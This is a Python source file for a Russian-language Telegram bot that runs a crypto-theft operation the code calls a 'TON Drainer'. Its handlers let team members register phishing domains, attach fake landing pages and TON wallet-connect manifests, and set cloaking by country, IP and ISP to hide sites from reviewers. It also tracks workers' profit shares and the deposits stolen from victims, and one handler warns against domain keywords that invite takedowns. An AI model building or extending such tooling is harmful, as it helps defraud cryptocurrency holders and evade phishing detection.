import json
from decimal import Decimal
from aiogram import types, Router, F
from aiogram.filters import CommandStart, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, Message
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.orm import joinedload

from states import states
from keyboards import main_keyboard, domains_keyboard
import config
from main import bot
from sqlalchemy import select
from database import models
from database.database import get_db
from database.models import User, Domains, SubDomains, Landing, Manifest, Cloaking
from keyboards.main_keyboard import main_menu
from middlewares.user_middleware import AuthorizeMiddleware
import dns.resolver

from states.states import CloakingState

router = Router()  # Создаем роутер для обработчиков
router.message.middleware(AuthorizeMiddleware())
router.callback_query.middleware(AuthorizeMiddleware())


@router.message(F.text == "🌐 Домены")
async def domains(message: Message, user: User, session: AsyncSession):
    domains_query = await session.execute(select(Domains).where(Domains.user_tg_id == user.tg_id))
    domains = domains_query.scalars().all()

    subdomains_query = await session.execute(select(SubDomains).where(SubDomains.user_tg_id == user.tg_id))
    subdomains = subdomains_query.scalars().all()

    text = "🌐 <b>Меню доменов</b>\n\n"  # Заголовок и отступ

    if domains:
        for i, domain in enumerate(domains):
            end_date_str = domain.end_date.strftime("%d.%m") if domain.end_date else "Не указано"
            text += f"{i + 1}. {domain.domain}: {domain.registration_date}\n"


    else:
        text += "Домены отсутствуют\n"
    keyboard = await domains_keyboard.get_domain_kb(user, session)
    await message.answer(text=text, parse_mode="HTML", reply_markup=keyboard)


async def show_domain_page(session: AsyncSession, user: User):
    domains_query = await session.execute(select(Domains).where(Domains.user_tg_id == user.tg_id))
    domains = domains_query.scalars().all()

    subdomains_query = await session.execute(select(SubDomains).where(SubDomains.user_tg_id == user.tg_id))
    subdomains = subdomains_query.scalars().all()

    text = "🌐 <b>Меню доменов</b>\n\n"  # Заголовок и отступ

    if domains:
        for i, domain in enumerate(domains):
            end_date_str = domain.end_date.strftime("%d.%m") if domain.end_date else "Не указано"
            text += f"{i + 1}. {domain.domain}: {domain.registration_date}\n"


    else:
        text += "Домены отсутствуют\n"
    keyboard = await domains_keyboard.get_domain_kb(user, session)
    await bot.send_message(chat_id=user.tg_id, text=text, parse_mode="HTML", reply_markup=keyboard)


@router.callback_query(F.data == 'back_to_profile')
async def back_to_profile(call: CallbackQuery, user: User, session: AsyncSession):
    if call.data == 'back_to_profile':
        await call.message.delete()
        if user:
            text = (f"<b>Добро пожаловать в профиль</b>\n"
                    f"<b>{config.TEAM_NAME} TON Drainer</b>\n\n"
                    f"1️⃣ <b>Информация:</b>\n"
                    f"└👉 TG ID: <code>{user.tg_id}</code>\n"
                    f"└👉 Профиль lolz: <code>{user.lolz_profile}\n</code>"
                    f"└❕ Отображение ника в выплатах: <code>{user.nickname_display}</code>\n"
                    f"└👤 Статус: <code>{user.status}</code>\n"
                    f"└💲 Процент: <code>{user.percentage}</code>\n"
                    f"└⁉️ Лимит доменов: <code>{user.domains_limit}</code>\n"
                    f"└⁉️ Лимит ботов: <code>{user.bots_limit}</code>\n\n"
                    f"📊 <b>Статистика:</b>\n"
                    f"└💵 Текущий баланс: <code>{user.balance}$</code>\n"
                    f"└💰 Профитов: <code>{user.profits}$</code>\n"
                    f"└📅 Дата регистрации: <code>{user.registration_date}</code>\n\n"
                    f"💳 <b>Привязанные кошельки:</b>\n"
                    f"└TON: <code>{user.ton_wallet}</code>\n")

            await call.message.answer(text, parse_mode='HTML', reply_markup=main_keyboard.profile_menu)


@router.callback_query(F.data == 'create_domain')
async def create_new_domain(call: CallbackQuery, state: FSMContext):
    if call.data == 'create_domain':
        await call.message.delete()
        await call.message.answer(
            text='🌐 Введите ваш домен (<b>без</b> поддомена, его можно будет добавить позднее)\n\n'
                 'Пример: domain.com\n'
                 '❗️ <i>Не рекомендуется использовать домены с ключеми словами, связанные с проектами и прочим во избежание КТ.'
                 '(* будет заменено на .)</i>', parse_mode='HTML', disable_web_page_preview=True,
            reply_markup=domains_keyboard.back_to_profile)
        await state.set_state(states.DomainState.new_domain)


@router.message(StateFilter(states.DomainState.new_domain))
async def add_new_domain(message: Message, state: FSMContext, session: AsyncSession, user: User):
    new_domain = message.text
    await state.clear()
    try:
        await message.answer(text='🕔 Ожидайте, получаем NS (это может занять некоторое время)')
        resolver = dns.resolver.Resolver()
        ns_records = resolver.resolve(new_domain, 'NS')
        try:
            async with session:
                domain = Domains(
                    domain=new_domain,
                    user_tg_id=user.tg_id,  # Use user.tg_id
                    end_date=None,  # Or set an appropriate end date
                    type="private"  # Or "public", as needed
                )
                session.add(domain)
                await session.commit()
                await session.refresh(domain)
        except Exception as db_e:
            await session.rollback()  # Rollback on database error
            await message.answer(f"❌ Ошибка добавления в базу данных: {db_e}")  # Inform the user
            print(f"Database error: {db_e}")  # Log the error for debugging
        kb = domains_keyboard.get_found_domain_kb(domain.id)
        await message.answer(text='✅ Запрос на добавление домена отправлен!\n\n'
                                  '<b>Статус:</b> <code>Успешно</code>\n'
                                  '<b>Сообщение:</b> <code>Успешно</code>\n'
                                  f'<b>NS:</b> <code>{ns_records[0]}\n{ns_records[1]}</code>', parse_mode='HTML',
                             reply_markup=kb)

    except dns.resolver.NXDOMAIN:
        await message.answer("❌ Домен не существует")  # Use await message.answer()
    except dns.resolver.NoAnswer:
        await message.answer("❌ NS записи не найдены")  # Use await message.answer()
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")  # Use await message.answer()


@router.callback_query(F.data.startswith('domain_settings|'))
async def domain_settings(call: CallbackQuery, session: AsyncSession, state: FSMContext):
    landing_name = "Не установлен"
    domain_id = int(call.data.split('|')[1])
    domain_query = await session.execute(select(Domains).where(Domains.id == domain_id))
    domain = domain_query.scalars().first()
    if domain:
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '8.8.4.4']  # Use Google Public DNS
            resolver.nameservers = ['1.1.1.1', '1.0.0.1']  # Use Cloudflare DNS
            resolver.nameservers = ['9.9.9.9', '149.112.112.112']  # Use Quad9
            ns_records = resolver.resolve(domain.domain, 'NS')
        except dns.resolver.LifetimeTimeout:
            ns_records = ["DNS Timeout", "DNS Timeout"]  # Or some other default value
            print(f"DNS resolution timed out for {domain.domain}")
        except dns.resolver.NXDOMAIN:  # Catch domain not found errors
            ns_records = ["Domain Not Found", "Domain Not Found"]
            print(f"Domain {domain.domain} not found")
        except Exception as e:  # Catch other errors
            ns_records = ["DNS Error", "DNS Error"]
            print(f"DNS resolution error: {e}")
        kb = domains_keyboard.create_chosen_domain_kb(domain_id)
        if domain.landing_id:
            landing_query = await session.execute(select(Landing).where(Landing.id == domain.landing_id))
            landing = landing_query.scalars().first()
            if landing:
                landing_name = landing.name
        await state.update_data(domain_id=domain_id)
        await call.message.edit_text(text=f'🌐 <b>Домен</b> {domain.domain}:\n\n'
                                          f'<b>🕒 Статус: </b> <code>{domain.status}</code>\n'
                                          f'<b>📄 Ленд: </b> <code>{landing_name}</code>\n'
                                          f'<b>📅 Дата добавления:</b> <code>{domain.registration_date}</code>\n\n'
                                          f'<b>1️⃣ NS1:</b> <code>{ns_records[0]}</code>\n'
                                          f'<b>2️⃣ NS2:</b> <code>{ns_records[1]}</code>\n\n', parse_mode='HTML',
                                     reply_markup=kb)
    else:
        await call.answer('Домен не найден')


@router.callback_query(F.data.startswith('domain_design|'))
async def domain_landing(call: CallbackQuery, session: AsyncSession):
    await call.message.edit_text(text='🎨 Выберите лендинг', reply_markup=await domains_keyboard.get_landing_kb(session))


@router.callback_query(F.data.startswith('choose_landing|'))
async def choose_landing(call: CallbackQuery, session: AsyncSession, state: FSMContext):
    landing_id = int(call.data.split('|')[1])
    landing_query = await session.execute(select(Landing).where(Landing.id == landing_id))
    landing = landing_query.scalars().first()
    await state.update_data(landing_id=landing_id)
    if landing:
        if landing.preview:
            await call.message.delete()
            await bot.send_photo(text=f'👀 Предпросмотр лендинга: <i>{landing.name}</i>',
                                 reply_markup=domains_keyboard.landing_menu, parse_mode='HTML', photo=landing.preview)
        else:
            await call.message.answer(text=f'👀 Предпросмотра лендинга нет: <i>{landing.name}</i>',
                                      reply_markup=domains_keyboard.landing_menu, parse_mode='HTML', )


@router.callback_query(F.data == 'install_landing' or F.data == 'back_to_landings')
async def install_landing(call: CallbackQuery, session: AsyncSession, state: FSMContext, user: User):
    if call.data == 'install_landing':
        data = await state.get_data()
        domain_id = data.get('domain_id')
        landing_id = data.get('landing_id')
        async with session:
            domain = await session.execute(select(Domains).where(Domains.id == domain_id))
            domain = domain.scalars().first()
            domain.landing_id = landing_id
            await session.commit()
            await session.refresh(domain)
        await call.message.edit_text(text='✅ Лендинг успешно установлен!')
    elif call.data == 'back_to_landings':
        await call.message.delete()
        await call.message.answer(text='🌐 Выберите лендинг',
                                  reply_markup=await domains_keyboard.get_landing_kb(session))


@router.callback_query(F.data == 'back_to_domains')
async def back_to_domains(call: CallbackQuery, session: AsyncSession, user: User):
    if call.data == 'back_to_domains':
        domains_query = await session.execute(select(Domains).where(Domains.user_tg_id == user.tg_id))
        domains1 = domains_query.scalars().all()
        await call.message.delete()
        subdomains_query = await session.execute(select(SubDomains).where(SubDomains.user_tg_id == user.tg_id))
        subdomains = subdomains_query.scalars().all()

        text = "🌐 <b>Меню доменов</b>\n\n"  # Заголовок и отступ

        if domains1:
            for i, domain in enumerate(domains1):
                end_date_str = domain.end_date.strftime("%d.%m") if domain.end_date else "Не указано"
                text += f"{i + 1}. {domain.domain}: {domain.registration_date}\n"
        else:
            text += "Домены отсутствуют\n"
        keyboard = await domains_keyboard.get_domain_kb(user, session)
        await call.message.answer(text=text, parse_mode="HTML", reply_markup=keyboard)


@router.callback_query(F.data.startswith('manifest_settings|'))
async def manifest_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    domain_id = int(call.data.split('|')[1])
    await state.update_data(domain_id=domain_id)
    # Use joinedload to eagerly load the manifest relationship
    query = select(Domains).filter(Domains.id == domain_id).options(joinedload(Domains.manifest))
    domain_query = await session.execute(query)
    domain = domain_query.scalars().first()

    if domain:  # Check if the domain exists
        if domain.manifest:
            # Now domain.manifest is already loaded, no lazy loading needed
            await call.message.edit_text(text='⚙️ Манифест\n'
                                              f'<b>└ 💠 Основная ссылка:</b> {domain.manifest.link or "Не указано"}\n'
                                              f'<b>└ 📝 Название:</b> {domain.manifest.title or "Не указано"}\n'
                                              f'<b>└ 🖼 Ссылка на изображение:</b> {domain.manifest.picture or "Не указано"}\n',
                                         reply_markup=domains_keyboard.manifest, parse_mode='HTML')
            await state.update_data(manifest_id=domain.manifest.id)
        else:
            try:
                async with session:
                    manifest = Manifest()
                    session.add(manifest)
                    await session.commit()
                    await session.refresh(manifest)

                    domain.manifest_id = manifest.id
                    await session.commit()
                    await session.refresh(domain)

                    await call.message.edit_text(text='⚙️ Манифест\n'
                                                      f'<b>└ 💠 Основная ссылка:</b> {domain.manifest.link or "Не указано"}\n'
                                                      f'<b>└ 📝 Название:</b> {domain.manifest.title or "Не указано"}\n'
                                                      f'<b>└ 🖼 Ссылка на изображение:</b> {domain.manifest.picture or "Не указано"}\n',
                                                 reply_markup=domains_keyboard.manifest, parse_mode='HTML')
                    await state.update_data(manifest_id=domain.manifest.id)
            except Exception as e:
                await session.rollback()
                await call.message.answer(f"❌ Ошибка создания манифеста: {e}")
                print(f"Manifest creation error: {e}")
    else:
        await call.message.answer("Domain not found.")  # Handle the case if the domain doesn't exist.


@router.callback_query(F.data.startswith('dom_manifest_'))
async def dom_manifest(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    setting = call.data.split('_')[2]
    if setting == 'link':
        await state.set_state(states.ManifestState.manifest_link)
        await call.message.edit_text(text='💠 Введите ссылку для манифеста')
    elif setting == 'name':
        await state.set_state(states.ManifestState.manifest_title)
        await call.message.edit_text(text='📝 Введите название для манифеста')
    elif setting == 'image':
        await state.set_state(states.ManifestState.manifest_image)
        await call.message.edit_text(text='🖼 Введите ссылку на изображение для манифеста')


@router.message(StateFilter(states.ManifestState.manifest_link))
async def manifest_link(message: Message, state: FSMContext, session: AsyncSession, user: User):
    link = message.text
    data = await state.get_data()
    manifest_id = data.get('manifest_id')
    try:
        async with session:
            manifest = await session.get(Manifest, manifest_id)
            if manifest:
                manifest.link = link
                await session.commit()
                await session.refresh(manifest)
                await message.answer(text='💠 Ссылка для манифеста сохранена')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer(text='❌ Манифест не найден.')
    except Exception as e:
        await session.rollback()
        await message.answer(f"❌ Ошибка сохранения ссылки: {e}")
        print(f"Error saving link: {e}")


@router.message(StateFilter(states.ManifestState.manifest_title))
async def manifest_title(message: Message, state: FSMContext, session: AsyncSession, user: User):
    title = message.text
    data = await state.get_data()
    manifest_id = data.get('manifest_id')
    try:
        async with session:
            manifest = await session.get(Manifest, manifest_id)
            if manifest:
                manifest.title = title
                await session.commit()
                await session.refresh(manifest)
                await message.answer(text='📝 Название для манифеста сохранено')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer(text='❌ Манифест не найден.')
    except Exception as e:
        await session.rollback()
        await message.answer(f"❌ Ошибка сохранения названия: {e}")
        print(f"Error saving title: {e}")


@router.message(StateFilter(states.ManifestState.manifest_image))
async def manifest_image(message: Message, state: FSMContext, session: AsyncSession, user: User):
    image_url = message.text  # Or handle file uploads if needed
    data = await state.get_data()
    manifest_id = data.get('manifest_id')
    try:
        async with session:
            manifest = await session.get(Manifest, manifest_id)
            if manifest:
                manifest.picture = image_url
                await session.commit()
                await session.refresh(manifest)
                await message.answer(text='🖼 Ссылка на изображение для манифеста сохранена')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer(text='❌ Манифест не найден.')
    except Exception as e:
        await session.rollback()
        await message.answer(f"❌ Ошибка сохранения ссылки на изображение: {e}")
        print(f"Error saving image URL: {e}")


@router.callback_query(F.data.startswith('cloaka_settings|'))
async def cloaka_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    ips = None
    domain_id = int(call.data.split('|')[1])
    await state.update_data(domain_id=domain_id)
    # Use joinedload to eagerly load the manifest relationship
    query = select(Domains).filter(Domains.id == domain_id).options(joinedload(Domains.cloaking))
    domain_query = await session.execute(query)
    domain = domain_query.scalars().first()

    if domain:  # Check if the domain exists
        if domain.cloaking:
            # Now domain.manifest is already loaded, no lazy loading needed
            if domain.cloaking.ips:
                ips = len(domain.cloaking.ips)
            await call.message.edit_text(text='⚙️ Настройки клоакинга:\n'
                                              f'<b>└ 🌍 Страны:</b> {domain.cloaking.countries or "Не указано"}\n'
                                              f'<b>└ 🔒 IP адреса:</b> {ips or "Не указано"}\n'
                                              f'<b>└ 🏢 ISP провайдеры:</b> {domain.cloaking.isp_providers or "Не указано"}\n',
                                         reply_markup=domains_keyboard.cloaking, parse_mode='HTML')
            await state.update_data(cloaking_id=domain.cloaking.id)
        else:
            try:
                async with session:
                    cloaking = Cloaking()
                    session.add(cloaking)
                    await session.commit()
                    await session.refresh(cloaking)

                    domain.cloaking_id = cloaking.id
                    await session.commit()
                    await session.refresh(domain)
                    if domain.cloaking.ips:
                        ips = len(domain.cloaking.ips)
                    await call.message.edit_text(text='⚙️ Настройки клоакинга:\n'
                                                      f'<b>└ 🌍 Страны:</b> {domain.cloaking.countries or "Не указано"}\n'
                                                      f'<b>└ 🔒 IP адреса:</b> {ips or "Не указано"}\n'
                                                      f'<b>└ 🏢 ISP провайдеры:</b> {domain.cloaking.isp_providers or "Не указано"}\n',
                                                 reply_markup=domains_keyboard.cloaking, parse_mode='HTML')
                    await state.update_data(cloaking_id=domain.cloaking.id)
            except Exception as e:
                await session.rollback()
                await call.message.answer(f"❌ Ошибка создания манифеста: {e}")
                print(f"Manifest creation error: {e}")
    else:
        await call.message.answer("Domain not found.")  # Handle the case if the domain doesn't exist.


@router.callback_query(F.data.startswith('dom_cloaking_'))
async def dom_cloaking(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    setting = call.data.split('_')[2]
    if setting == 'countries':
        await state.set_state(states.CloakingState.countries)
        await call.message.edit_text(text='🌍 Введите коды стран через запятую')
    elif setting == 'ips':
        await state.set_state(states.CloakingState.ips)
        await call.message.edit_text(text='🔒 Введите IP адреса через запятую')
    elif setting == 'isp':
        await state.set_state(states.CloakingState.isp_providers)
        await call.message.edit_text(text='🏢 Введите ISP провайдеры через запятую')


@router.message(StateFilter(CloakingState.countries))
async def cloaking_countries(message: Message, state: FSMContext, session: AsyncSession, user: User):
    countries_str = message.text
    countries_list = [c.strip() for c in countries_str.split(',')]
    data = await state.get_data()
    cloaking_id = data.get('cloaking_id')

    try:
        async with session:
            cloaking = await session.get(Cloaking, cloaking_id)

            if cloaking:
                cloaking.countries = json.dumps(countries_list)  # Convert list to JSON string
                await session.commit()
                await session.refresh(cloaking)
                await message.answer(text=' Список стран для клоакинга обновлен.')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer("❌ Запись клоакинга не найдена.")

    except Exception as e:
        await session.rollback()
        await message.answer(f"❌ Ошибка обновления списка стран: {e}")
        print(f"Ошибка обновления списка стран: {e}")


@router.message(StateFilter(CloakingState.ips))
async def cloaking_ips(message: Message, state: FSMContext, session: AsyncSession, user: User):
    ips_str = message.text  # Получаем строку с IP адресами
    ips_list = [ip.strip() for ip in ips_str.split(',')]  # Разделяем на список и очищаем от пробелов

    data = await state.get_data()
    cloaking_id = data.get('cloaking_id')

    try:
        async with session:
            cloaking = await session.get(Cloaking, cloaking_id)

            if cloaking:
                cloaking.ips = json.dumps(ips_list)  # Обновляем список IP адресов
                await session.commit()
                await session.refresh(cloaking)
                await message.answer(text=' Список IP адресов для клоакинга обновлен.')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer("❌ Запись клоакинга не найдена.")

    except Exception as e:
        await session.rollback()
        await message.answer(f"❌ Ошибка обновления списка IP адресов: {e}")
        print(f"Ошибка обновления списка IP адресов: {e}")


@router.message(StateFilter(CloakingState.isp_providers))
async def cloaking_isp(message: Message, state: FSMContext, session: AsyncSession, user: User):
    isp_str = message.text  # Получаем строку с названиями ISP
    isp_list = [isp.strip() for isp in isp_str.split(',')]  # Разделяем на список и очищаем от пробелов

    data = await state.get_data()
    cloaking_id = data.get('cloaking_id')

    try:
        async with session:
            cloaking = await session.get(Cloaking, cloaking_id)

            if cloaking:
                cloaking.isp_providers = json.dumps(isp_list)  # Обновляем список ISP провайдеров
                await session.commit()
                await session.refresh(cloaking)
                await message.answer(text=' Список ISP провайдеров для клоакинга обновлен.')
                await show_domain_page(session, user)
                await state.clear()
            else:
                await message.answer("❌ Запись клоакинга не найдена.")

    except Exception as e:
        await session.rollback()
        await message.answer(f"❌ Ошибка обновления списка ISP провайдеров: {e}")
        print(f"Ошибка обновления списка ISP провайдеров: {e}")


@router.callback_query(F.data.startswith('drainer_settings|'))
async def drainer_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    await call.message.answer(
        text='Не знаю, какой функционал тут нужен. Что такое фейк жетоны и скрытие TON я без понятия')


@router.callback_query(F.data.startswith('statistics_settings|'))
async def statistics_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    domain_id = int(call.data.split('|')[1])
    domain_query = await session.execute(select(Domains).filter(Domains.id == domain_id))
    domain = domain_query.scalars().first()
    await call.message.answer(text=f'📊 <i>Статистика домена {domain.domain} за все время:</i>\n'
                                   f'└ Всего визитов: <code>{domain.visits}</code>\n'
                                   f'└ Всего депозитов: <code>{domain.deposits_count}</code>\n'
                                   f'└ Общая сумма: <code>{domain.deposit_amount} $</code>\n'
                                   f'<i>Примечание: статистика за все время может быть неточной</i>',
                              reply_markup=domains_keyboard.back_to_domains)


@router.callback_query(F.data.startswith('copy_settings|'))
async def copy_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession, user: User):
    domain_id = int(call.data.split('|')[1])
    await state.update_data(domain_id=domain_id)
    domain_query = await session.execute(select(Domains).filter(Domains.id == domain_id))
    kb = await domains_keyboard.get_copy_domain_kb(session, user, domain_id)
    await call.message.edit_text(text='ℹ️ Перенос всех настроек домена кроме дизайна.'
                                      '💁🏻‍♂️ Выберите домен куда перенести', reply_markup=kb)


@router.callback_query(F.data.startswith('copy_domain_settings|'))
async def copy_domain_settings(call: CallbackQuery, state: FSMContext, session: AsyncSession, user: User):
    chosen_domain_id = int(call.data.split('|')[1])
    data = await state.get_data()
    current_domain_id = data.get('domain_id')
    try:
        async with session:  # Keep the transaction
            # Eager load both relationships
            current_domain_result = await session.execute(
                select(Domains)
                .options(joinedload(Domains.manifest))
                .options(joinedload(Domains.cloaking))
                .filter(Domains.id == current_domain_id)
            )
            current_domain = current_domain_result.scalars().first()  # Await scalars()

            chosen_domain_result = await session.execute(
                select(Domains)
                .filter(Domains.id == chosen_domain_id)
            )
            chosen_domain = chosen_domain_result.scalars().first()  # Await scalars()

            if not current_domain or not chosen_domain:
                await call.message.answer("❌ Один из доменов не найден.")
                return

            # Copy Manifest settings (now safe to access current_domain.manifest)
            if current_domain.manifest:
                if chosen_domain.manifest:
                    chosen_domain.manifest.title = current_domain.manifest.title
                    chosen_domain.manifest.picture = current_domain.manifest.picture
                    chosen_domain.manifest.link = current_domain.manifest.link
                else:
                    # Correct way to copy attributes:
                    new_manifest = Manifest(
                        title=current_domain.manifest.title,
                        picture=current_domain.manifest.picture,
                        link=current_domain.manifest.link
                    )
                    session.add(new_manifest)
                    await session.flush()
                    chosen_domain.manifest_id = new_manifest.id

            # Copy Cloaking settings (now safe to access current_domain.cloaking)
            if current_domain.cloaking:
                if chosen_domain.cloaking:
                    chosen_domain.cloaking.countries = current_domain.cloaking.countries
                    chosen_domain.cloaking.ips = current_domain.cloaking.ips
                    chosen_domain.cloaking.isp_providers = current_domain.cloaking.isp_providers
                else:
                    # Correct way to copy attributes:
                    new_cloaking = Cloaking(
                        countries=current_domain.cloaking.countries,
                        ips=current_domain.cloaking.ips,
                        isp_providers=current_domain.cloaking.isp_providers
                    )
                    session.add(new_cloaking)
                    await session.flush()
                    chosen_domain.cloaking_id = new_cloaking.id

            await session.commit()  # Commit the transaction
            await call.message.edit_text("✅ Настройки скопированы успешно.")
            # await show_domain_page(session, user) # if show_domain_page needs to be called after that, call it with await
    except Exception as e:
        await session.rollback()
        await call.message.answer(f"❌ Ошибка копирования настроек: {e}")
        print(f"Ошибка копирования настроек: {e}")


@router.callback_query(F.data.startswith('delete_domain|'))
async def delete_domain(call: CallbackQuery, state: FSMContext, session: AsyncSession):
    domain_id = int(call.data.split('|')[1])
    await state.update_data(domain_id=domain_id)
    await call.message.edit_text(text='❓ Вы уверены, что хотите удалить домен?', reply_markup=domains_keyboard.delete_confirm)


@router.callback_query(F.data == 'delete_confirm' or F.data == 'delete_cancel')
async def delete_confirm(call: CallbackQuery, state: FSMContext, session: AsyncSession, user: User):
    if call.data == 'delete_confirm':
        data = await state.get_data()
        domain_id = data.get('domain_id')
        domain_query = await session.execute(select(Domains).filter(Domains.id == domain_id))
        domain = domain_query.scalars().first()
        await session.delete(domain)
        await session.commit()
        await call.message.answer(text='✅ Домен удален')
        await show_domain_page(session, call.from_user)
    elif call.data == 'delete_cancel':
        await call.message.answer(text='❌ Удаление отменено')
        await show_domain_page(session, user)
